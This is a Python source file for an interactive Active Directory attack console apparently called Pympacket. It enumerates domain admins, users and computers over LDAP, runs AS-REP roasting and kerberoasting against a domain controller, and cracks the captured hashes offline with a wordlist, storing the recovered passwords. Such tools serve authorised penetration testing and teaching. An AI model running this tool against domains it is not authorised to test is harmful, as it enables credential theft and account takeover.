import cmd
import argparse
import re
from pympacket.utils.bruteforce import bruteforce
#from pympacket.attacks.GetNPUsersbak import GetUserNoPreAuth
from pympacket.utils.storage import load_storage, save_storage, Storage
from pympacket.utils.kerberoasting import kerberoast
from pympacket.utils.asreproasting import asreproast
from pympacket.models.common import Hash, CrackedUser, Computer
from typing import Any
import os
from pympacket.utils.raw_ldap_enum import ldap_login
from pympacket.utils.raw_ldap_enum import domain_sid
from pympacket.utils.raw_ldap_enum import group_member
from pympacket.utils.raw_ldap_enum import enum_users
from pympacket.utils.raw_ldap_enum import enum_computers
from tabulate import tabulate

def ipv4_address(value):
    # Regular expression to match an IPv4 address (four octets)
    pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if not re.match(pattern, value):
        raise argparse.ArgumentTypeError(f"Invalid IPv4 address: {value}")
    return value

def extract_user(hash: Hash):
    # Split the hash by `$` to isolate the user@domain part
    user_realm = hash.value.split('$')[3]

    # Split the user@domain part by `@` to get only the user
    return user_realm.split('@')[0]

class ImpacketCLI(cmd.Cmd):
    # Your CLI commands and functionality will go here
    prompt = '>> '
    intro = 'Welcome to Pympacket. Type "help" for available commands.'  # Your intro message
    storage: Storage

    def __init__(self):
        super().__init__()
        self.storage = load_storage()

    def save_hash(self, data):
        user = data['username']
        if 'tgs' in data:
            hash = Hash(value=data['tgs'], type='tgs')
        else:
            hash = Hash(value=data['asrep'], type='asrep')
        if user not in self.storage.found_users:
            self.storage.found_users.append(user)
            self.storage.found_hashes.append(hash)
        else:
            self.storage.found_hashes[self.storage.found_users.index(user)] = hash
        save_storage(self.storage)

    def save_password(self, password: str, hash: Hash):
        self.storage.cracked_hashes.append(CrackedUser(username=extract_user(hash), password=password, hash=hash))
        save_storage(self.storage)

    def save_computer(self, computer_dict):
        self.storage.computers.append(Computer(name=computer_dict['name'], is_dc=computer_dict['is_dc'], dns_hostname=computer_dict['dns_hostname'],))

    def do_enum(self, args):
        """Get hashes of users with no pre-authentication"""
        parser = argparse.ArgumentParser(prog='enum', description='Runs an enumeration test.')
        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
        parser.add_argument('-dc-ip', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')

        group = parser.add_argument_group()

        group.add_argument('-u', '--username', type=str, required=False, help='The username to test.')
        group.add_argument('-p', '--password', type=str, required=False, help='The password to test.')
        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
        group.add_argument('-w', '--wordlist', type=str, required=False, help='The wordlist containing the users to test.')
        group.add_argument('-v', '--verbose', type=bool, required=False, help='Whether to print the process or not.')
        group.add_argument('-t', '--type', type=str, choices=['auto', 'asrep', 'spn', 'ldap'] , required=False, default='auto', help='What kind of enumeration to perform.')
        print()

        try:
            args = parser.parse_args(args.split())
            if not (args.username and (args.password or args.nthash)) and not args.wordlist:
                parser.error("Username and password or a wordlist are required.")
            if args.type == 'spn' and not (args.username and (args.password or args.nthash)):
                parser.error("Username and password are required to perform SPNs enumeration.")
            if args.type == 'ldap' and not (args.username and (args.password or args.nthash)):
                parser.error("Username and password are required to perform LDAP enumeration.")

            if args.type == 'spn' or (args.type == 'auto' and args.username and (args.password or args.nthash)):
                print("Beginning LDAP Enumeration:")
                conn, domain_base = ldap_login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain)
                print(f"Domain SID: {domain_sid(conn, domain_base)}")
                print()
                domain_admins = group_member(conn, domain_base, "Domain Admins")
                print(f"List of Domain Admins:")
                for user in domain_admins:
                     print(user)
                print()
                users = enum_users(conn, domain_base)
                print("Domain Users:")
                print(tabulate(users, headers="keys", tablefmt="grid"))
                print()
                print("Domain Computers:")
                computers = enum_computers(conn, domain_base, dc_ip=args.dc_ip)
                print(tabulate(computers, headers="keys", tablefmt="grid"))
                print()

            if args.type == 'asrep' or (args.type == 'auto'):
                print("Beginning asreproasting:")
                if (args.username and (args.password or args.nthash)):
                    users = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
                else:
                    users = asreproast(dc_ip=args.dc_ip, domain=args.domain, usersfile=args.wordlist)
                print("Retrieved asrep for the following users:")
                for user in users:
                    print(user['username'])
                    self.save_hash(user)
                print()

            if args.type == 'spn' or (args.type == 'auto' and args.username and (args.password or args.nthash)):
                print("Beginning kerberoasting")
                users = kerberoast(username=args.username, domain=args.domain, dc_ip=args.dc_ip, password=args.password, nthash=args.nthash)
                print("Retrieved tgs for the following spn:")
                for user in users:
                    print(user['username'])
                    self.save_hash(user)
                print()

        except SystemExit:
            print("Invalid arguments. Use 'help enum' for usage details.")

    def do_bruteforce(self, args):
        """Offline bruteforce found  hashes."""
        parser = argparse.ArgumentParser(prog='bruteforce', description='Performs an offline bruteforce.')

        parser.add_argument('-w', '--wordlist', type=str, required=True, help='The wordlist containing the users to test.')
        parser.add_argument('-t', '--type', type=str, choices=['auto', 'asrep', 'tgs'], required=False, default='auto', help='The wordlist containing the users to test.')
        parser.add_argument('-v', '--verbose', type=bool, required=False, help='Whether to print the process or not.')

        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            print("Invalid arguments. Use 'help bruteforce' for usage details.")
            return

        found_passwords = 0
        
        for hash in self.storage.found_hashes:
            if (args.type == hash.type or args.type == 'auto'):
                password = bruteforce(args.wordlist, hash)
                if password:
                    found_passwords+=1
                    self.save_password(password, hash)

        print(f'Cracked {found_passwords} vulnerable hashes.')

    def do_list_hashes(self, args):
        """List found vulnerable hashes."""
        for hash in self.storage.found_hashes:
            print(f'{hash}\n')
        if len(self.storage.found_hashes) == 0:
            print('No hashes stored in memory.')
    
    def do_list_users(self, args):
        """List cracked users credentials."""
        for user in self.storage.cracked_hashes:
            print(f'{user}\n')
        if len(self.storage.cracked_hashes) == 0:
            print('No users stored in memory.')

    def do_clear(self, args):
        """Clear the CLI."""
        # For Windows
        if os.name == 'nt':
            os.system('cls')
        # For Linux and macOS
        else:
            os.system('clear')

    def do_forget(self, args):
        """Clears the saved storage and memory."""
        self.storage = Storage()
        save_storage(self.storage)

    def do_quit(self, line):
        """Exit the CLI."""
        save_storage(self.storage)
        return True
